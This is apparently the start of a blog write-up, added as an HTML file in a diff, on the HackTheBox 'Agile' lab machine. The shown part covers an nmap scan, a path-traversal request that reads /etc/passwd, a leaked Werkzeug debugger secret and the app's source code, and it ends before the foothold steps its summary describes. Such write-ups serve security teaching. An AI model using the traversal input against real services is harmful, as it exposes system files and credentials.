@@ -1,0 +1,1775 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Agile is a medium difficulty box presented as an online password manager. By abusing unsanitized user input in the service's download funcion to access system files, in combination with overly verbose error messages, we are able to replicate the Python Werkzeug's debugger PIN number and achieve remote code execution as www-data. With shell access we can find one user's credentials in the mysql database, followed by another user's credentials after hijacking a google chrome session with the --remote-debugging-port flag set. By abusing a sudoedit vulnerability, we are able to edit a script frequently run by the root user, allowing us to take actions as root, leading to full root access.">
+<title>HackTheBox - Agile</title>
+
+<link rel='canonical' href='http://localhost:1313/p/hackthebox-agile/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="HackTheBox - Agile">
+<meta property='og:description' content="Agile is a medium difficulty box presented as an online password manager. By abusing unsanitized user input in the service's download funcion to access system files, in combination with overly verbose error messages, we are able to replicate the Python Werkzeug's debugger PIN number and achieve remote code execution as www-data. With shell access we can find one user's credentials in the mysql database, followed by another user's credentials after hijacking a google chrome session with the --remote-debugging-port flag set. By abusing a sudoedit vulnerability, we are able to edit a script frequently run by the root user, allowing us to take actions as root, leading to full root access.">
+<meta property='og:url' content='http://localhost:1313/p/hackthebox-agile/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Arbitrary File Read' /><meta property='article:tag' content='Werkzeug' /><meta property='article:tag' content='Python' /><meta property='article:tag' content='sudo' /><meta property='article:published_time' content='2023-08-05T09:04:19-05:00'/><meta property='article:modified_time' content='2023-08-05T09:04:19-05:00'/><meta property='og:image' content='http://localhost:1313/p/hackthebox-agile/Agile.png' />
+<meta name="twitter:title" content="HackTheBox - Agile">
+<meta name="twitter:description" content="Agile is a medium difficulty box presented as an online password manager. By abusing unsanitized user input in the service's download funcion to access system files, in combination with overly verbose error messages, we are able to replicate the Python Werkzeug's debugger PIN number and achieve remote code execution as www-data. With shell access we can find one user's credentials in the mysql database, followed by another user's credentials after hijacking a google chrome session with the --remote-debugging-port flag set. By abusing a sudoedit vulnerability, we are able to edit a script frequently run by the root user, allowing us to take actions as root, leading to full root access."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/p/hackthebox-agile/Agile.png' />
+    <link rel="shortcut icon" href="/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu897059592634026878.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#enumeration">Enumeration</a>
+      <ol>
+        <li><a href="#arbitrary-file-read-in-download">Arbitrary file read in <code>/download</code></a></li>
+        <li><a href="#unsuccessful-foothold-attempts">Unsuccessful Foothold Attempts</a>
+          <ol>
+            <li><a href="#recreating-exportcsv">Recreating export.csv</a></li>
+            <li><a href="#forging-a-flask-cookie">Forging a flask cookie</a></li>
+            <li><a href="#idor-access-on-other-users-passwords">IDOR access on other user&rsquo;s passwords</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#foothold">Foothold</a>
+      <ol>
+        <li><a href="#recreating-werkzeugs-debugger-pin">Recreating Werkzeug&rsquo;s Debugger PIN</a></li>
+        <li><a href="#remote-code-execution-as-www-data">Remote Code Execution as <code>www-data</code></a></li>
+      </ol>
+    </li>
+    <li><a href="#lateral-movement">Lateral Movement</a>
+      <ol>
+        <li><a href="#accessing-the-sql-database">Accessing the SQL database</a></li>
+        <li><a href="#hijacking-a-google-chrome-session-through-remote-debugging-port">Hijacking a google chrome session through remote-debugging port</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation-through-sudo-vulnerability">Privilege escalation through <code>sudo</code> vulnerability</a></li>
+    <li><a href="#reflection">Reflection</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/hackthebox-agile/">
+                <img src="/p/hackthebox-agile/Agile_hu8056783623442757117.png"
+                        srcset="/p/hackthebox-agile/Agile_hu8056783623442757117.png 800w, /p/hackthebox-agile/Agile_hu15400648147759948633.png 1600w"
+                        width="800" 
+                        height="606" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Agile" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-the-box/" >
+                Hack the Box
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/hackthebox-agile/">HackTheBox - Agile</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Agile is a medium difficulty box presented as an online password manager. By abusing unsanitized user input in the service&#39;s download funcion to access system files, in combination with overly verbose error messages, we are able to replicate the Python Werkzeug&#39;s debugger PIN number and achieve remote code execution as www-data. With shell access we can find one user&#39;s credentials in the mysql database, followed by another user&#39;s credentials after hijacking a google chrome session with the --remote-debugging-port flag set. By abusing a sudoedit vulnerability, we are able to edit a script frequently run by the root user, allowing us to take actions as root, leading to full root access.
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 05, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    16 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="enumeration">Enumeration
+</h2><p>Initial nmap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nmap 7.92 scan initiated Sat Mar  4 14:42:58 2023 as: nmap -sCV -A -oN nmap_init.txt 10.129.27.120</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.27.120
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.038s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://superpass.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Sat Mar  4 14:43:10 2023 -- 1 IP address (1 host up) scanned in 11.87 seconds</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Aside from credential-locked <code>ssh</code>, port, we only see http port 80 open. The nmap shows that we will be redirected to <a class="link" href="http://sueprpass.htb"  target="_blank" rel="noopener"
+    >http://sueprpass.htb</a>, so we must add this to our /etc/hosts file in order to properly visit:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ tail /etc/hosts
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
+</span></span><span class="line"><span class="cl">::1     ip6-localhost ip6-loopback
+</span></span><span class="line"><span class="cl">fe00::0 ip6-localnet
+</span></span><span class="line"><span class="cl">ff00::0 ip6-mcastprefix
+</span></span><span class="line"><span class="cl">ff02::1 ip6-allnodes
+</span></span><span class="line"><span class="cl">ff02::2 ip6-allrouters
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">10.10.11.203 superpass.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We see superpass as a super password manager:</p>
+<p><img src="/p/hackthebox-agile/Images/SuperpassHomepage.png"
+	width="1270"
+	height="596"
+	srcset="/p/hackthebox-agile/Images/SuperpassHomepage_hu10301898691857742895.png 480w, /p/hackthebox-agile/Images/SuperpassHomepage_hu3086785400865135321.png 1024w"
+	loading="lazy"
+	
+		alt="Home Page"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="213"
+		data-flex-basis="511px"
+	
+></p>
+<p>Trying to login with generic credentials does not succeed, but we are able to register an account, <code>asdf:asdf</code></p>
+<p><img src="/p/hackthebox-agile/Images/Register.png"
+	width="490"
+	height="410"
+	srcset="/p/hackthebox-agile/Images/Register_hu12082689829875221025.png 480w, /p/hackthebox-agile/Images/Register_hu2099392866275110096.png 1024w"
+	loading="lazy"
+	
+		alt="asdf registration"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="119"
+		data-flex-basis="286px"
+	
+></p>
+<p>We see a vault where we can begin to generate passwords, and label them with sites/usernames.</p>
+<p><img src="/p/hackthebox-agile/Images/PassGen.png"
+	width="935"
+	height="314"
+	srcset="/p/hackthebox-agile/Images/PassGen_hu12752981434259370205.png 480w, /p/hackthebox-agile/Images/PassGen_hu12439457959069609585.png 1024w"
+	loading="lazy"
+	
+		alt="Add a password"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="297"
+		data-flex-basis="714px"
+	
+></p>
+<p>The export feature is interesting, as depending on how the query is designed, we may be able to alter our request and receive unintended responses. Using burpsuite, we can intercept our traffic and get a better idea on how we are interacting with the web service.</p>
+<p>We can see upon clicking <code>Export</code> we are sent to the url <a class="link" href="http://superpass.htb/vault/export"  target="_blank" rel="noopener"
+    >http://superpass.htb/vault/export</a> on a GET request:</p>
+<p><img src="/p/hackthebox-agile/Images/NoPass.png"
+	width="1029"
+	height="421"
+	srcset="/p/hackthebox-agile/Images/NoPass_hu8970397506478637644.png 480w, /p/hackthebox-agile/Images/NoPass_hu4804997274834766615.png 1024w"
+	loading="lazy"
+	
+		alt="No password error"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="244"
+		data-flex-basis="586px"
+	
+></p>
+<p>An interesting finding at this point, we see that <code>superpass.htb</code> server
+is described as nginx. However, this /vault/export pathway is not a .php file, as visiting superpass.htb/vault/export.php results in <code>404 Not Found</code>. We will eventually learn that this service is running from Flask, although it wasn&rsquo;t apparent at first glance if you didn&rsquo;t run into the common SQLAlchemy error.</p>
+<p>Since we didn&rsquo;t click the save icon when generating out password, it seems like our database is still empty.</p>
+<p>Once we add a password, we can see the call redirects to a custom url, <code>download?fn=asdf_export_49adcafaf8.csv</code>. We might be able to reverse the process that generates the names, but regardless we will need more information such as usernames before we could take advantage:</p>
+<p><img src="/p/hackthebox-agile/Images/Export.png"
+	width="1030"
+	height="450"
+	srcset="/p/hackthebox-agile/Images/Export_hu2417343893286696823.png 480w, /p/hackthebox-agile/Images/Export_hu12538547574591742652.png 1024w"
+	loading="lazy"
+	
+		alt="Burpsuite Export"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="228"
+		data-flex-basis="549px"
+	
+></p>
+<h3 id="arbitrary-file-read-in-download">Arbitrary file read in <code>/download</code>
+</h3><p>In a simpler approach, we can check if we are able to reference any file by specifying the path:
+<code>http://superpass.htb/download?fn=../../../../../../../etc/passwd</code></p>
+<p>Upon visiting this link, we receive a download prompt for our file. We can proceed to visit each url we want to check then open the downloaded file individually, or we can see the output directly through burpsuite:</p>
+<p><img src="/p/hackthebox-agile/Images/etc_passwd.png"
+	width="1026"
+	height="499"
+	srcset="/p/hackthebox-agile/Images/etc_passwd_hu10328091720073318834.png 480w, /p/hackthebox-agile/Images/etc_passwd_hu14994425893789996818.png 1024w"
+	loading="lazy"
+	
+		alt="/etc/passwd"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="205"
+		data-flex-basis="493px"
+	
+></p>
+<p>In this file we can see 4 user accounts:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">corum:x:1000:1000:corum:/home/corum:/bin/bash
+</span></span><span class="line"><span class="cl">runner:x:1001:1001::/app/app-testing/:/bin/sh
+</span></span><span class="line"><span class="cl">edwards:x:1002:1002::/home/edwards:/bin/bash
+</span></span><span class="line"><span class="cl">dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Viewing a non-existent file we can see interesting information through the given error. The service is utilizing Werkzeug Debugger (python Flask), the download function is pulling from <code>/tmp/</code> and the flask SECRET is also displayed:</p>
+<p><img src="/p/hackthebox-agile/Images/Error.png"
+	width="849"
+	height="611"
+	srcset="/p/hackthebox-agile/Images/Error_hu783470910096193842.png 480w, /p/hackthebox-agile/Images/Error_hu4983903638141087228.png 1024w"
+	loading="lazy"
+	
+		alt="Flask Error"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="138"
+		data-flex-basis="333px"
+	
+>
+Note, the SECRET is only visible when looking at the source page, or through raw output such as Burpsuite or <code>curl</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">   <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="kd">var</span> <span class="nx">CONSOLE_MODE</span> <span class="o">=</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">          <span class="nx">EVALEX</span> <span class="o">=</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">          <span class="nx">EVALEX_TRUSTED</span> <span class="o">=</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">          <span class="nx">SECRET</span> <span class="o">=</span> <span class="s2">&#34;tDxE1kBphctDjlZ1DvYf&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The last section in the traceback is particularly important, as it gives a full pathway to our source files so that we might view them exploiting this <code>download</code> vulnerability.</p>
+<p><img src="/p/hackthebox-agile/Images/Vault_views.png"
+	width="1040"
+	height="635"
+	srcset="/p/hackthebox-agile/Images/Vault_views_hu10900573551363036613.png 480w, /p/hackthebox-agile/Images/Vault_views_hu14277611735501641432.png 1024w"
+	loading="lazy"
+	
+		alt="Vault Views"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="163"
+		data-flex-basis="393px"
+	
+></p>
+<p>From here, we can enumerate all or most of the python source files by watching the imports. For example, <code>from superpass.services.utility_service import get_random</code> tells us that there is a python file accessible at <code>/app/app/superpass/services/utility_service.py</code>. We can also determine that the main <code>app.py</code> file will be located at <code>/app/app/superpass/app.py</code>, based on where the import path is starting.</p>
+<h3 id="unsuccessful-foothold-attempts">Unsuccessful Foothold Attempts
+</h3><h4 id="recreating-exportcsv">Recreating export.csv
+</h4><p>My first thought is to see how the export is behaving. Since we have a list of usernames on the machine, perhaps we can recall an export.csv that they have previously generated?
+I find my answer in
+<code>/app/app/superpass/views/services/password_service.py</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">generate_csv</span><span class="p">(</span><span class="n">user</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">rand</span> <span class="o">=</span> <span class="n">get_random</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fn</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">user</span><span class="o">.</span><span class="n">username</span><span class="si">}</span><span class="s1">_export_</span><span class="si">{</span><span class="n">rand</span><span class="si">}</span><span class="s1">.csv&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;/tmp/</span><span class="si">{</span><span class="n">fn</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">header</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;Site&#39;</span><span class="p">,</span> <span class="s1">&#39;Username&#39;</span><span class="p">,</span> <span class="s1">&#39;Password&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">session</span> <span class="o">=</span> <span class="n">db_session</span><span class="o">.</span><span class="n">create_session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">passwords</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">query</span><span class="p">(</span><span class="n">Password</span><span class="p">)</span> \
+</span></span><span class="line"><span class="cl">        <span class="o">.</span><span class="n">filter</span><span class="p">(</span><span class="n">Password</span><span class="o">.</span><span class="n">user_id</span> <span class="o">==</span> <span class="n">user</span><span class="o">.</span><span class="n">id</span><span class="p">)</span> \
+</span></span><span class="line"><span class="cl">        <span class="o">.</span><span class="n">all</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">writer</span> <span class="o">=</span> <span class="n">csv</span><span class="o">.</span><span class="n">writer</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">writer</span><span class="o">.</span><span class="n">writerow</span><span class="p">(</span><span class="n">header</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">writer</span><span class="o">.</span><span class="n">writerows</span><span class="p">((</span><span class="n">p</span><span class="o">.</span><span class="n">get_dict</span><span class="p">()</span><span class="o">.</span><span class="n">values</span><span class="p">()</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It looks like the numbers appended are from get_random, defined in <code>/app/app/superpass/services/utility_service.py</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">datetime</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_random</span><span class="p">(</span><span class="n">chars</span><span class="o">=</span><span class="mi">20</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;SeCReT?!&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="n">chars</span><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
